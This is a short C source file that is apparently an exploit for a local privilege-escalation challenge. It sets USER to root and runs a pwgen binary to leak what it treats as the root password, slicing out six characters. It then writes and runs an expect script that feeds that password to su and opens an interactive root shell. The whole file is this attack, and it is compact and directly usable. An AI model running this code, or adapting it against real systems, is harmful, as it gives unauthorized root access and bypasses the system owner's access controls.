#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char const *argv[]) {
    char *line = NULL;
    char *real = NULL;
    int size = 37;
    FILE *script;
    FILE *pass;

    real = malloc(sizeof(char)*7);
    setenv("USER","root",1);

    system("/usr/local/bin/pwgen -w > pass");
    pass = fopen("pass","r");

    getline(&line,&size,pass);
    strncpy(real, line+31, 6);

    script = fopen("script","w");

    fprintf(script, "#!/usr/bin/expect\n");
    fprintf(script, "spawn su -c /bin/sh\n");
    fprintf(script, "expect \"Password: \"\n");
    fprintf(script, "send ");
    fprintf(script, "\"");
    fprintf(script, "%s",real);
    fprintf(script, "\\r");
    fprintf(script, "\"");
    fprintf(script, "\n");
    fprintf(script, "interact\n");
    fclose(script);
    system("rm pass");
    system("expect script");
    exit(0);
}